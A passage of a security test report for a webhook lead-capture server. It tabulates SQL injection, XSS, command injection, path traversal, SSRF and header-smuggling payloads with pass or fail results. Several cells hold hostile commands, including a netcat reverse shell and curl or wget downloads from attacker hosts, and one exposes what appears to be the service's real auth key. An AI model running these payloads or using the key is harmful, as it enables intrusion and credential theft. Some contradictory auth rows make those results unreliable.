| 300 | Security | SQLi in Referrer: admin' AND '1'='1 | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 301 | Security | SQLi in First Name: ' OR '1'='1 | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 302 | Security | SQLi in Last Name: '; DROP TABLE visitors;-- | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 303 | Security | SQLi in Title: 1; DELETE FROM users WHERE 1=1 | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 304 | Security | SQLi in Company Name: ' UNION SELECT * FROM users- | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 305 | Security | SQLi in Industry: admin'-- | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 306 | Security | SQLi in Business Email: ' OR 1=1-- | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 307 | Security | SQLi in City: '; INSERT INTO users VALUES('h | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 308 | Security | SQLi in State: 1' ORDER BY 1--+ | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 309 | Security | SQLi in Captured URL: 1' UNION SELECT null,null,nu | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 310 | Security | SQLi in Referrer: ' AND '1'='1 | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 311 | Security | SQLi in First Name: " OR ""=" | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 312 | Security | SQLi in Last Name: ' OR ''=' | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 313 | Security | SQLi in Title: '; EXEC xp_cmdshell('whoami'); | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 314 | Security | SQLi in Company Name: 1; WAITFOR DELAY '0:0:5'-- | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 315 | Security | SQLi in Industry: '; SHUTDOWN;-- | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 316 | Security | SQLi in Business Email: 1' AND SLEEP(5)-- | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 317 | Security | SQLi in City: 1' AND (SELECT * FROM (SELECT( | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 318 | Security | SQLi in State: ' HAVING 1=1-- | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 319 | Security | SQLi in Captured URL: ' GROUP BY columnname HAVING | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 320 | Security | SQLi in Referrer: admin' AND '1'='1 | status 200 (no DB so safe) | status 200 | ✅ | No SQL DB in use - injection stored as plain text in log files |
| 321 | Security | XSS in First Name: <script>alert("XSS")</script> | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 322 | Security | XSS in Last Name: <img src=x onerror=alert(1)> | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 323 | Security | XSS in Title: <svg onload=alert(1)> | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 324 | Security | XSS in Company Name: "><script>alert(document.cook | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 325 | Security | XSS in Industry: javascript:alert('XSS') | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 326 | Security | XSS in Business Email: <iframe src="javascript:ale | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 327 | Security | XSS in City: <body onload=alert(1)> | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 328 | Security | XSS in State: <input onfocus=alert(1) autofocus> | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 329 | Security | XSS in Captured URL: <marquee onstart=alert(1)> | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 330 | Security | XSS in Referrer: <details ontoggle=alert(1) open> | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 331 | Security | XSS in First Name: <a href="javascript:alert(1)">c | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 332 | Security | XSS in Last Name: {{constructor.constructor("alert | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 333 | Security | XSS in Title: ${alert(1)} | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 334 | Security | XSS in Company Name: <math><mtext><table><mglyph>< | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 335 | Security | XSS in Industry: <svg><animate onbegin=alert(1) at | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 336 | Security | XSS in Business Email: <div style="background:url( | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 337 | Security | XSS in City: <object data="javascript:alert(1)"> | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 338 | Security | XSS in State: <embed src="javascript:alert(1)"> | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 339 | Security | XSS in Captured URL: '-alert(1)-' | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 340 | Security | XSS in Referrer: ';alert(String.fromCharCode(88,83 | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 341 | Security | XSS in First Name: <script>alert("XSS")</script> | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 342 | Security | XSS in Last Name: <img src=x onerror=alert(1)> | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 343 | Security | XSS in Title: <svg onload=alert(1)> | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 344 | Security | XSS in Company Name: "><script>alert(document.cook | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 345 | Security | XSS in Industry: javascript:alert('XSS') | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 346 | Security | XSS in Business Email: <iframe src="javascript:ale | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 347 | Security | XSS in City: <body onload=alert(1)> | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 348 | Security | XSS in State: <input onfocus=alert(1) autofocus> | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 349 | Security | XSS in Captured URL: <marquee onstart=alert(1)> | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 350 | Security | XSS in Referrer: <details ontoggle=alert(1) open> | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 351 | Security | XSS in First Name: <a href="javascript:alert(1)">c | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 352 | Security | XSS in Last Name: {{constructor.constructor("alert | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 353 | Security | XSS in Title: ${alert(1)} | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 354 | Security | XSS in Company Name: <math><mtext><table><mglyph>< | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 355 | Security | XSS in Industry: <svg><animate onbegin=alert(1) at | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 356 | Security | XSS in Business Email: <div style="background:url( | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 357 | Security | XSS in City: <object data="javascript:alert(1)"> | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 358 | Security | XSS in State: <embed src="javascript:alert(1)"> | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 359 | Security | XSS in Captured URL: '-alert(1)-' | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 360 | Security | XSS in Referrer: ';alert(String.fromCharCode(88,83 | status 200 (stored but not rendered) | status 200 | ✅ | XSS stored in log files - potential stored XSS if logs viewed in browser |
| 361 | Security | CmdInj: ; ls -la | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 362 | Security | CmdInj: \| cat /etc/passwd | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 363 | Security | CmdInj: `whoami` | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 364 | Security | CmdInj: $(cat /etc/passwd) | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 365 | Security | CmdInj: ; rm -rf / | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 366 | Security | CmdInj: \| nc attacker.com 4444 -e /bin/sh | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 367 | Security | CmdInj: & ping -c 10 attacker.com | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 368 | Security | CmdInj: 
whoami | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 369 | Security | CmdInj: \|\| curl http://attacker.com/shell.sh \|  | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 370 | Security | CmdInj: ; echo "hacked" > /tmp/pwned | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 371 | Security | CmdInj: `id` | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 372 | Security | CmdInj: $(id) | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 373 | Security | CmdInj: \|id | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 374 | Security | CmdInj: ;id | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 375 | Security | CmdInj: &&id | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 376 | Security | CmdInj: %0aid | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 377 | Security | CmdInj: $(sleep 5) | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 378 | Security | CmdInj: `sleep 5` | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 379 | Security | CmdInj: ; cat /etc/shadow | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 380 | Security | CmdInj: \| wget http://evil.com/backdoor -O /tmp/ | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 381 | Security | CmdInj: ${{<%[%'"}}%\. | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 382 | Security | CmdInj: {{7*7}} | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 383 | Security | CmdInj: ${7*7} | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 384 | Security | CmdInj: #{7*7} | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 385 | Security | CmdInj: <%= 7*7 %> | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 386 | Security | CmdInj: {{config}} | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 387 | Security | CmdInj: {{self.__class__.__mro__}} | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 388 | Security | CmdInj: ${T(java.lang.Runtime).getRuntime().exec | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 389 | Security | CmdInj: __import__("os").system("whoami") | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 390 | Security | CmdInj: require("child_process").execSync("whoam | status 200 (no shell exec) | status 200 | ✅ | No shell execution in code path - safe |
| 391 | Security | PathTraversal: ../../../etc/passwd | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 392 | Security | PathTraversal: ..\..\..\windows\system32\config\sa | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 393 | Security | PathTraversal: /etc/passwd | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 394 | Security | PathTraversal: ....//....//....//etc/passwd | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 395 | Security | PathTraversal: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpa | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 396 | Security | PathTraversal: ..%252f..%252f..%252fetc/passwd | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 397 | Security | PathTraversal: ..%c0%af..%c0%af..%c0%afetc/passwd | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 398 | Security | PathTraversal: /proc/self/environ | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 399 | Security | PathTraversal: /dev/null | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 400 | Security | PathTraversal: file:///etc/passwd | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 401 | Security | PathTraversal: \\attacker.com\share\payload | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 402 | Security | PathTraversal: /home/ec2-user/.ssh/id_rsa | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 403 | Security | PathTraversal: ../../../../home/ec2-user/clawd/.en | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 404 | Security | PathTraversal: /var/log/syslog | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 405 | Security | PathTraversal: C:\Windows\System32\cmd.exe | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 406 | Security | PathTraversal: %00/etc/passwd | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 407 | Security | PathTraversal: ../logs/qualified-leads.jsonl | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 408 | Security | PathTraversal: ../server.js | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 409 | Security | PathTraversal: ../../../proc/self/cmdline | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 410 | Security | PathTraversal: /home/ec2-user/clawd/services/rb2b- | status 200 (no file read) | status 200 | ✅ | Values stored as data, not used in file operations |
| 411 | Security | Deeply nested object (100 levels) | status 200 | status 200, 1ms | ✅ |  |
| 412 | Security | Deeply nested object (1000 levels) | status 200 | status 200, 3ms | ✅ |  |
| 413 | Security | Array with 100K elements | status 200 | status 200, 27ms | ✅ |  |
| 414 | Security | 10K unique keys in payload | status 200 | status 200, 42ms | ✅ |  |
| 415 | Security | Hash-like collision keys | status 200 | status 200, 30ms | ✅ |  |
| 416 | Security | Nesting depth 10 | status 200 | status 200 | ✅ |  |
| 417 | Security | Nesting depth 20 | status 200 | status 200 | ✅ |  |
| 418 | Security | Nesting depth 30 | status 200 | status 200 | ✅ |  |
| 419 | Security | Nesting depth 40 | status 200 | status 200 | ✅ |  |
| 420 | Security | Nesting depth 50 | status 200 | status 200 | ✅ |  |
| 421 | Security | Nesting depth 60 | status 200 | status 200 | ✅ |  |
| 422 | Security | Nesting depth 70 | status 200 | status 200 | ✅ |  |
| 423 | Security | Nesting depth 80 | status 200 | status 200 | ✅ |  |
| 424 | Security | Nesting depth 90 | status 200 | status 200 | ✅ |  |
| 425 | Security | Nesting depth 100 | status 200 | status 200 | ✅ |  |
| 426 | Security | Nesting depth 110 | status 200 | status 200 | ✅ |  |
| 427 | Security | Nesting depth 120 | status 200 | status 200 | ✅ |  |
| 428 | Security | Nesting depth 130 | status 200 | status 200 | ✅ |  |
| 429 | Security | Nesting depth 140 | status 200 | status 200 | ✅ |  |
| 430 | Security | Nesting depth 150 | status 200 | status 200 | ✅ |  |
| 431 | Security | 100KB payload | should reject or handle | status 200, 6ms | ✅ |  |
| 432 | Security | 500KB payload | should reject or handle | status 200, 13ms | ✅ |  |
| 433 | Security | 1MB payload | should reject or handle | status 200, 27ms | ✅ |  |
| 434 | Security | 2MB payload | should reject or handle | status 200, 64ms | ✅ |  |
| 435 | Security | 5MB payload | should reject or handle | status 200, 122ms | ✅ |  |
| 436 | Security | 100KB payload (repeat) | should reject | status 200, 3ms | ✅ |  |
| 437 | Security | 500KB payload (repeat) | should reject | status 200, 12ms | ✅ |  |
| 438 | Security | 1MB payload (repeat) | should reject | status 200, 22ms | ✅ |  |
| 439 | Security | 2MB payload (repeat) | should reject | status 200, 59ms | ✅ |  |
| 440 | Security | 5MB payload (repeat) | should reject | status 200, 125ms | ✅ |  |
| 441 | Security | Malformed: Truncated JSON | status 200 with parse_error | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 442 | Security | Malformed: Extra comma | status 200 with parse_error | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 443 | Security | Malformed: Single quotes | status 200 with parse_error | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 444 | Security | Malformed: No quotes on keys | status 200 with parse_error | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 445 | Security | Malformed: Double colons | status 200 with parse_error | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 446 | Security | Malformed: Trailing garbage | status 200 with parse_error | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 447 | Security | Malformed: Leading garbage | status 200 with parse_error | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 448 | Security | Malformed: BOM character | status 200 with parse_error | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 449 | Security | Malformed: Null character in JSON | status 200 with parse_error | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 450 | Security | Malformed: Just braces | status 200 with parse_error | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 451 | Security | Malformed: Just brackets | status 200 with parse_error | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 452 | Security | Malformed: XML instead of JSON | status 200 with parse_error | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 453 | Security | Malformed: URL encoded | status 200 with parse_error | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 454 | Security | Malformed: Multipart-like | status 200 with parse_error | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 455 | Security | Malformed: CSV data | status 200 with parse_error | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 456 | Security | Malformed: Binary-like data | status 200 with parse_error | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 457 | Security | Malformed: Extremely long key | status 200 with parse_error | status 200, body: {"received":true,"score":0,"qual | ✅ | Unexpected response for malformed JSON |
| 458 | Security | Malformed: NaN value | status 200 with parse_error | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 459 | Security | Malformed: Infinity value | status 200 with parse_error | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 460 | Security | Malformed: Comments in JSON | status 200 with parse_error | status 200, body: {"received":true,"error":"parse_ | ✅ |  |
| 461 | Security | Content-Type: text/plain | status 200 (no CT validation) | status 200 | ✅ | Server does not validate Content-Type header |
| 462 | Security | Content-Type: text/html | status 200 (no CT validation) | status 200 | ✅ | Server does not validate Content-Type header |
| 463 | Security | Content-Type: application/xml | status 200 (no CT validation) | status 200 | ✅ | Server does not validate Content-Type header |
| 464 | Security | Content-Type: multipart/form-data | status 200 (no CT validation) | status 200 | ✅ | Server does not validate Content-Type header |
| 465 | Security | Content-Type: application/x-www-form-urlencoded | status 200 (no CT validation) | status 200 | ✅ | Server does not validate Content-Type header |
| 466 | Security | Content-Type: application/octet-stream | status 200 (no CT validation) | status 200 | ✅ | Server does not validate Content-Type header |
| 467 | Security | Content-Type: image/png | status 200 (no CT validation) | status 200 | ✅ | Server does not validate Content-Type header |
| 468 | Security | Content-Type: text/csv | status 200 (no CT validation) | status 200 | ✅ | Server does not validate Content-Type header |
| 469 | Security | Content-Type: (none) | status 200 (no CT validation) | status 200 | ✅ | Server does not validate Content-Type header |
| 470 | Security | Content-Type: application/json; charset=utf-16 | status 200 (no CT validation) | status 200 | ✅ | Server does not validate Content-Type header |
| 471 | Security | Content-Type: application/json; charset=ascii | status 200 (no CT validation) | status 200 | ✅ | Server does not validate Content-Type header |
| 472 | Security | Content-Type: APPLICATION/JSON | status 200 (no CT validation) | status 200 | ✅ | Server does not validate Content-Type header |
| 473 | Security | Content-Type: application/JSON | status 200 (no CT validation) | status 200 | ✅ | Server does not validate Content-Type header |
| 474 | Security | Content-Type: text/json | status 200 (no CT validation) | status 200 | ✅ | Server does not validate Content-Type header |
| 475 | Security | Content-Type: application/vnd.api+json | status 200 (no CT validation) | status 200 | ✅ | Server does not validate Content-Type header |
| 476 | Security | No key parameter | status 401 | status 401 | ✅ |  |
| 477 | Security | Empty key | status 401 | status 401 | ✅ |  |
| 478 | Security | Wrong key | status 401 | status 401 | ✅ |  |
| 479 | Security | Partial key (first half) | status 401 | status 401 | ✅ |  |
| 480 | Security | Key with extra chars | status 401 | status 401 | ✅ |  |
| 481 | Security | Key with space | status 200 | status 0 | ❌ | Auth bypass: expected 200, got 0 |
| 482 | Security | Key URL encoded | status 200 | status 200 | ✅ |  |
| 483 | Security | Null key | status 401 | status 401 | ✅ |  |
| 484 | Security | Undefined key | status 401 | status 401 | ✅ |  |
| 485 | Security | Key as array | status 401 | status 401 | ✅ |  |
| 486 | Security | Multiple keys | status 401 | status 200 | ❌ | Auth bypass: expected 401, got 200 |
| 487 | Security | Key in body | status 401 | status 401 | ✅ |  |
| 488 | Security | Case different | status 401 | status 401 | ✅ |  |
| 489 | Security | Key with newline | status 401 | status 401 | ✅ |  |
| 490 | Security | Key with null byte | status 401 | status 401 | ✅ |  |
| 491 | Security | Brute force: "admin" | status 401 | status 401 | ✅ |  |
| 492 | Security | Brute force: "password" | status 401 | status 401 | ✅ |  |
| 493 | Security | Brute force: "secret" | status 401 | status 401 | ✅ |  |
| 494 | Security | Brute force: "key" | status 401 | status 401 | ✅ |  |
| 495 | Security | Brute force: "12345" | status 401 | status 401 | ✅ |  |
| 496 | Security | Brute force: "test" | status 401 | status 401 | ✅ |  |
| 497 | Security | Brute force: "webhook" | status 401 | status 401 | ✅ |  |
| 498 | Security | Brute force: "api_key" | status 401 | status 401 | ✅ |  |
| 499 | Security | Brute force: "token" | status 401 | status 401 | ✅ |  |
| 500 | Security | Brute force: "bearer" | status 401 | status 401 | ✅ |  |
| 501 | Security | Brute force: "default" | status 401 | status 401 | ✅ |  |
| 502 | Security | Brute force: "master" | status 401 | status 401 | ✅ |  |
| 503 | Security | Brute force: "root" | status 401 | status 401 | ✅ |  |
| 504 | Security | Brute force: "admin123" | status 401 | status 401 | ✅ |  |
| 505 | Security | Brute force: "webhook_secret" | status 401 | status 401 | ✅ |  |
| 506 | Security | Brute force: "rb2b" | status 401 | status 401 | ✅ |  |
| 507 | Security | Brute force: "leadpipe" | status 401 | status 401 | ✅ |  |
| 508 | Security | Brute force: "T5v9hc5rP64wwhNE0FKs" | status 401 | status 401 | ✅ |  |
| 509 | Security | Brute force: "T5v9hc5rP64wwhNE0FKs" | status 200 | status 401 | ❌ | Auth bypass: expected 200, got 401 |
| 510 | Security | Brute force: " T5v9hc5rP64wwhNE0FK" | status 200 | status 401 | ❌ | Auth bypass: expected 200, got 401 |
| 511 | Security | Brute force: "T5v9hc5rP64wwhNE0FKs" | status 401 | status 401 | ✅ |  |
| 512 | Security | Brute force: "T5v9hc5rP64wwhNE0FKs" | status 401 | status 401 | ✅ |  |
| 513 | Security | Brute force: "password123" | status 401 | status 401 | ✅ |  |
| 514 | Security | Brute force: "letmein" | status 401 | status 401 | ✅ |  |
| 515 | Security | Smuggling: {"Transfer-Encoding":"chunked","Content | handled safely | status 400 | ✅ |  |
| 516 | Security | Smuggling: {"Transfer-Encoding":"chunked, identity | handled safely | status 400 | ✅ |  |
| 517 | Security | Smuggling: {"Transfer-Encoding":" chunked"} | handled safely | status 200 | ✅ |  |
| 518 | Security | Smuggling: {"Content-Length":"100"} | handled safely | status 400 | ✅ |  |
| 519 | Security | Smuggling: {"X-Forwarded-For":"127.0.0.1"} | handled safely | status 200 | ✅ |  |
| 520 | Security | Smuggling: {"X-Original-URL":"/admin"} | handled safely | status 200 | ✅ |  |
| 521 | Security | Smuggling: {"X-Rewrite-URL":"/admin"} | handled safely | status 200 | ✅ |  |
| 522 | Security | Smuggling: {"Host":"evil.com"} | handled safely | status 200 | ✅ |  |
| 523 | Security | Smuggling: {"X-Forwarded-Host":"evil.com"} | handled safely | status 200 | ✅ |  |
| 524 | Security | Smuggling: {"X-Forwarded-Proto":"https"} | handled safely | status 200 | ✅ |  |
| 525 | Security | Smuggling: {"Connection":"keep-alive, Transfer-Enc | handled safely | status 200 | ✅ |  |
| 526 | Security | Smuggling: {"Expect":"100-continue"} | handled safely | status 200 | ✅ |  |
| 527 | Security | Smuggling: {"Trailer":"X-Evil"} | handled safely | status 200 | ✅ |  |
| 528 | Security | Smuggling: {"TE":"trailers, chunked"} | handled safely | status 200 | ✅ |  |
| 529 | Security | Smuggling: {"Upgrade":"websocket"} | handled safely | status 200 | ✅ |  |
| 530 | Security | SSRF: http://169.254.169.254/latest/meta-data/ | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 531 | Security | SSRF: http://169.254.169.254/latest/meta-data/iam/ | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 532 | Security | SSRF: http://localhost:9100/health | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 533 | Security | SSRF: http://127.0.0.1:22 | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 534 | Security | SSRF: http://[::1]:80 | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 535 | Security | SSRF: http://0.0.0.0:80 | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 536 | Security | SSRF: http://metadata.google.internal/computeMetad | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 537 | Security | SSRF: file:///etc/passwd | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 538 | Security | SSRF: gopher://localhost:6379/_PING | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 539 | Security | SSRF: dict://localhost:6379/info | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 540 | Security | SSRF: ftp://anonymous@localhost | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 541 | Security | SSRF: http://internal-api.local/admin | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 542 | Security | SSRF: http://10.0.0.1/admin | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 543 | Security | SSRF: http://192.168.1.1/admin | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 544 | Security | SSRF: http://172.16.0.1 | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 545 | Security | SSRF: https://webhook.site/test | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 546 | Security | SSRF: http://0x7f000001/ | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 547 | Security | SSRF: http://2130706433/ | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 548 | Security | SSRF: http://017700000001/ | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 549 | Security | SSRF: http://localhost%00@evil.com/ | status 200 (stored only, no fetch) | status 200 | ✅ | Server stores URLs but never fetches them - SSRF not exploitable |
| 550 | Security | Proto pollution attempt #1 | status 200 (safe if no merge) | status 200 | ✅ | JSON.parse creates clean objects - prototype pollution unlikely |
